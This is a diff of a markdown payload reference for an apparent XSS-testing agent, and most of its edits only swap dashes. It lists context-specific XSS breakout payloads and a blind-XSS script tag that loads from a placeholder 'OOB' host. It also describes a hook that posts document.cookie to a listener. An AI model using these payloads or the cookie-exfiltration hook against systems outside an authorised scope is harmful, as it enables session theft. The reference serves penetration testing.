@@ -1,15 +1,15 @@
-# payloads — xss-hunter
+# payloads - xss-hunter
 
 **Source:** `pentest-agent-development/notebooklm-notes/Guia Mestre de Vulnerabilidades XSS_ Detecção e Mitigação.md` (Section 5: PAYLOADS / PROBES)
 
 Payloads are grouped by reflection context. Before sending any payload,
 identify whether the input reflects into HTML body, an attribute, a URL
-attribute, a `<script>` block, or a JavaScript event handler — different
+attribute, a `<script>` block, or a JavaScript event handler - different
 contexts require different breakouts.
 
 ---
 
-## Step 0 — Probe the Reflection Context
+## Step 0 - Probe the Reflection Context
 
 ```
 XSS_PROBE_ABC123
@@ -58,7 +58,7 @@ When the probe lands inside an attribute value: `<input value="PROBE">`.
 ' onfocus='alert(1)' autofocus x='
 ```
 
-### No quotes available — use a space / greater-than
+### No quotes available - use a space / greater-than
 
 ```
  onfocus=alert(1) autofocus
@@ -78,7 +78,7 @@ When the probe appears inside a script block: `<script>var x = "PROBE";</script>
 </script><script>alert(1)</script>
 ```
 
-The `</script>` closer also works from inside a JS string — browsers
+The `</script>` closer also works from inside a JS string - browsers
 tokenize by `</script>` regardless of string context.
 
 ---
@@ -93,7 +93,7 @@ The value lands in an attribute that's already an event handler:
 ';alert(1);//
 ```
 
-No tag break needed — just close the JS function call.
+No tag break needed - just close the JS function call.
 
 ---
 
@@ -180,7 +180,7 @@ Another classic:
 
 ---
 
-## Stored XSS — Common Persistence Sinks
+## Stored XSS - Common Persistence Sinks
 
 Places where persisted input becomes a stored-XSS delivery vector:
 
@@ -190,7 +190,7 @@ Places where persisted input becomes a stored-XSS delivery vector:
 - Metadata fields on documents (`<title>`, image EXIF)
 - Error messages written into logs that are later rendered in an admin dashboard
 - Webhook payload fields that get logged and rendered
-- CSV / XLSX export cells (formula injection is adjacent — `=HYPERLINK(...)`)
+- CSV / XLSX export cells (formula injection is adjacent - `=HYPERLINK(...)`)
 
 Send a unique probe (`XSS-{random-uuid}`) to each candidate field, then
 browse every authenticated view of that object (admin UI, mobile app,
@@ -210,7 +210,7 @@ headless browsers and sandboxes. Safer, still-observable options:
 ```
 
 Note: exfiltrating the session cookie (`document.cookie`) is a
-confirmation-only probe — do NOT use a real victim's cookie in a
+confirmation-only probe - do NOT use a real victim's cookie in a
 pentest report; scrub or replace with `[REDACTED]`.
 
 ---
@@ -223,7 +223,7 @@ When the injection fires only in an admin / backend UI you cannot see:
 <script src="https://OOB/blind-xss-hook.js"></script>
 ```
 
-Host `blind-xss-hook.js` as a generic callback — POST `document.domain`,
+Host `blind-xss-hook.js` as a generic callback - POST `document.domain`,
 `document.URL`, `document.cookie` to an OOB listener. Frameworks like
 XSS Hunter (the public service) and `bxss` automate this.
 
@@ -234,6 +234,5 @@ Record domain scope in `security-scope.yaml` before using OOB callbacks.
 ## DOM Context (delegate to `dom-xss-hunter`)
 
 If the input source is `location.hash`, `document.URL`, `postMessage`,
-`window.name`, or `document.referrer`, delegate to `dom-xss-hunter` —
-the context analysis is different (client-side sinks: `innerHTML`,
+`window.name`, or `document.referrer`, delegate to `dom-xss-hunter` - the context analysis is different (client-side sinks: `innerHTML`,
 `document.write`, `eval`, `setTimeout(string)`, `Function(string)`).
